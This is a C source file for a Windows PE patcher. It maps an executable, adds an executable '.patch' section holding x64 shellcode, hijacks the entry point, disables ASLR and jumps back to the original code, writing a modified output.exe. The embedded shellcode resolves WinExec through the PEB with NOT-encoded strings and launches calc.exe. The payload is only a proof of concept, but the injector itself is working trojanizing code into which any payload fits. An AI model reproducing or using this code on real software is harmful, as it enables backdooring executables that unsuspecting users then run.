#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <Windows.h>

#define RVA32(base, rva) ((uint32_t)base + rva)
#define RVA64(base, rva) ((uint64_t)base + rva)
#define RVA(base, rva) ((size_t)base + rva)

#define NT_HEADERS(base) (PIMAGE_NT_HEADERS)RVA(base, ((PIMAGE_DOS_HEADER)base)->e_lfanew);

static size_t input_file_size = 0;

unsigned char shellcode[] = 
"\x48\x31\xff\x48\xf7\xe7\x65\x48\x8b\x58\x60\x48\x8b\x5b\x18\x48\x8b\x5b\x20\x48\x8b\x1b\x48\x8b\x1b\x48\x8b\x5b\x20\x49\x89\xd8\x8b"
"\x5b\x3c\x4c\x01\xc3\x48\x31\xc9\x66\x81\xc1\xff\x88\x48\xc1\xe9\x08\x8b\x14\x0b\x4c\x01\xc2\x4d\x31\xd2\x44\x8b\x52\x1c\x4d\x01\xc2"
"\x4d\x31\xdb\x44\x8b\x5a\x20\x4d\x01\xc3\x4d\x31\xe4\x44\x8b\x62\x24\x4d\x01\xc4\xeb\x32\x5b\x59\x48\x31\xc0\x48\x89\xe2\x51\x48\x8b"
"\x0c\x24\x48\x31\xff\x41\x8b\x3c\x83\x4c\x01\xc7\x48\x89\xd6\xf3\xa6\x74\x05\x48\xff\xc0\xeb\xe6\x59\x66\x41\x8b\x04\x44\x41\x8b\x04"
"\x82\x4c\x01\xc0\x53\xc3\x48\x31\xc9\x80\xc1\x07\x48\xb8\x0f\xa8\x96\x91\xba\x87\x9a\x9c\x48\xf7\xd0\x48\xc1\xe8\x08\x50\x51\xe8\xb0"
"\xff\xff\xff\x49\x89\xc6\x48\x31\xc9\x48\xf7\xe1\x50\x48\xb8\x9c\x9e\x93\x9c\xd1\x9a\x87\x9a\x48\xf7\xd0\x50\x48\x89\xe1\x48\xff\xc2"
"\x48\x83\xec\x20\x41\xff\xd6";

unsigned char jmpback[] =
"\x48\xB8\xCC\xCC\xCC\xCC\xCC\xCC\xCC\xCC"	// movabs rax, jmpback_address
"\x48\x89\xC2"								// mov rdx, rax
"\x65\x48\x8B\x0C\x25\x60\x00\x00\x00"		// mov rcx, [gs:0x60]
"\x48\x31\xDB"								// xor rbx, rbx
"\x48\x31\xF6"								// xor rsi, rsi
"\x48\x31\xFF"								// xor rdi, rdi
"\x48\x31\xED"								// xor rbp, rbp
"\xFF\xD0"									// call rax
"\xC3";										// ret

void rebuild_pe_binary(void* virtual_base) {
	int new_section_size = sizeof shellcode + sizeof jmpback/*Padding for file alignment*/;
	size_t new_pe_size = input_file_size + new_section_size;
	void* base = malloc(new_pe_size);
	if (!base) {
		printf("Could not allocate buffer for output pe!\n");
		return;
	}

	memset(base, 0, new_pe_size);

	memcpy_s(base, new_pe_size, virtual_base, 0x1000); //Copy DOS+NT headers

	//PIMAGE_NT_HEADERS p_nt_headers = (PIMAGE_NT_HEADERS)RVA64(base, ((PIMAGE_DOS_HEADER)base)->e_lfanew);

	PIMAGE_NT_HEADERS p_nt_headers = NT_HEADERS(base);

	int num_sections = p_nt_headers->FileHeader.NumberOfSections;
	PIMAGE_SECTION_HEADER section = IMAGE_FIRST_SECTION(p_nt_headers);
	for (int i = 0; i < num_sections; i++, section++) {
		printf("Section: %.8s  \tVirtual Address: 0x04%X \tRaw address: 0x%04X\tRaw size: 0x%04X\n", section->Name, section->VirtualAddress, section->PointerToRawData, section->SizeOfRawData);
		memcpy(RVA64(base, section->PointerToRawData), RVA64(virtual_base, section->VirtualAddress), section->SizeOfRawData);
	}

	const char* new_section_name = ".patch";
	memset(section, 0, sizeof(*section));
	memcpy(section->Name, new_section_name, strlen(new_section_name));
	section->VirtualAddress = p_nt_headers->OptionalHeader.SizeOfImage;
	section->SizeOfRawData = new_section_size;
	section->PointerToRawData = input_file_size;
	section->Misc.VirtualSize = 0x1000;
	section->Characteristics = 0x60000020;
	printf("Section: %.8s  \tVirtual Address: 0x04%X \tRaw address: 0x%04X\tRaw size: 0x%04X\n", section->Name, section->VirtualAddress, section->PointerToRawData, section->SizeOfRawData);

	memcpy_s(RVA64(base, input_file_size), 0x1000, shellcode, sizeof shellcode);

	uint64_t jmpback_address = p_nt_headers->OptionalHeader.AddressOfEntryPoint + p_nt_headers->OptionalHeader.ImageBase;

	*(uint64_t*)(jmpback + 2) = jmpback_address;

	memcpy(RVA64(base, input_file_size + sizeof shellcode - 1), jmpback, sizeof jmpback);

	p_nt_headers->OptionalHeader.AddressOfEntryPoint = p_nt_headers->OptionalHeader.SizeOfImage;
	p_nt_headers->FileHeader.NumberOfSections++;
	p_nt_headers->OptionalHeader.SizeOfImage += 0x1000;
	p_nt_headers->OptionalHeader.DllCharacteristics = 0x8120; //Disable ASLR for correct jumpback address

	printf("Patched... Writing output file!\n");

	FILE* out_file = fopen("output.exe", "wb");
	if (!out_file) {
		printf("Could not open output file!\n");
		free(base);
		return;
	}

	fwrite(base, new_pe_size, 1, out_file);

	fclose(out_file);
	free(base);

	printf("Done!\n");
}

void patch_iat(void* base) {

	PIMAGE_DOS_HEADER p_dos_header = (PIMAGE_DOS_HEADER)base;

	PIMAGE_NT_HEADERS p_nt_headers = RVA64(base, p_dos_header->e_lfanew);

	IMAGE_DATA_DIRECTORY import_directory = p_nt_headers->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT];
	PIMAGE_IMPORT_DESCRIPTOR import_descriptor = (PIMAGE_IMPORT_DESCRIPTOR)RVA64(base, import_directory.VirtualAddress);
	while (import_descriptor->Name != NULL) {

		const char* lib_name = RVA64(base, import_descriptor->Name);
		printf("----Import: %s----\n", lib_name);

		PIMAGE_THUNK_DATA orig_first_thunk = RVA64(base, import_descriptor->OriginalFirstThunk);
		PIMAGE_THUNK_DATA first_thunk = RVA64(base, import_descriptor->FirstThunk);

		while (orig_first_thunk->u1.AddressOfData != NULL) {

			PIMAGE_IMPORT_BY_NAME import_by_name = RVA64(base, orig_first_thunk->u1.AddressOfData);

			const char* import_name = import_by_name->Name;
			uint64_t import_address = RVA64(base, first_thunk->u1.Function);

			printf("%s: 0x%I64X\n", import_name, import_address);

			orig_first_thunk++;
			first_thunk++;
		}

		import_descriptor++;
	}
}

void parse_pe_binary(void* base) {

	PIMAGE_DOS_HEADER p_dos_header = (PIMAGE_DOS_HEADER)base;

	PIMAGE_NT_HEADERS p_nt_headers = RVA64(base, p_dos_header->e_lfanew);

	printf("Arch: 0x%04X\n", p_nt_headers->FileHeader.Machine);

	if (p_nt_headers->FileHeader.Machine == IMAGE_FILE_MACHINE_AMD64) {
		printf("Image is x64!\n");
	}
	else if (p_nt_headers->FileHeader.Machine == IMAGE_FILE_MACHINE_I386) {
		printf("Image is x86!\n");
	}

	void* virtual_base = malloc(p_nt_headers->OptionalHeader.SizeOfImage);
	if (!virtual_base) {
		printf("Could not allocate memory for virtual base!\n");
		return;
	}

	ZeroMemory(virtual_base, p_nt_headers->OptionalHeader.SizeOfImage);

	memcpy_s(virtual_base, p_nt_headers->OptionalHeader.SizeOfImage, base, 0x1000);

	int num_sections = p_nt_headers->FileHeader.NumberOfSections;
	PIMAGE_SECTION_HEADER section = IMAGE_FIRST_SECTION(p_nt_headers);
	for (int i = 0; i < num_sections; i++, section++) {
		if (section->SizeOfRawData) {
			memcpy(RVA64(virtual_base, section->VirtualAddress), RVA64(base, section->PointerToRawData), section->SizeOfRawData);
		}
	}

	patch_iat(virtual_base);

	rebuild_pe_binary(virtual_base);
	
	free(virtual_base);
}

/*if (argc < 2) {
		printf("Pass input file as argument\n");
		exit(1);
	}

	const char* in_file_name = argv[1];

	FILE* in_file = fopen(in_file_name, "rb");
	if (!in_file) {
		printf("Could not open input file %s!\n", in_file_name);
		exit(1);
	}

	fseek(in_file, 0, SEEK_END);
	input_file_size = ftell(in_file);
	fseek(in_file, 0, SEEK_SET);

	void* file_raw = malloc(input_file_size);
	if (!file_raw) {
		printf("Could not allocate buffer for pe file.\n");
		exit(1);
	}

	size_t read = fread(file_raw, input_file_size, 1, in_file);
	if (!read) {
		printf("Could not read bytes from input file!\n");
		exit(0);
	}
	fclose(in_file);

	parse_pe_binary(file_raw);
	free(file_raw);*/

/*
TODO:
Add intuitive API

load_pe, map_pe, add_import, add_section, rebuild_pe etc...

add sections after mapping pe, not after rebuilding

*/

#include "pepatch.h"

int main(int argc, char** argv) {
	
	pep_pe* pe = pep_load_pe_from_path("test.exe");

	pep_mapped_pe* mapped = pep_map_pe(pe);
	pep_free_pe(pe);

	pep_section new_section = pep_add_section(mapped, ".test", 0x1000, 0x60000020);
	pep_section new_section2 = pep_add_section(mapped, ".poop", 0x1000, 0x60000020);

	//size_t imp = pep_add_import(mapped, "KERNEL32.DLL", "LoadLibraryExW");

	pep_pe* unmapped = pep_rebuild_pe_to_memory(mapped);
	pep_free_mapped_pe(mapped);

	pep_pe_to_file(unmapped, "output.exe");
	pep_free_pe(unmapped);

	return 0;
}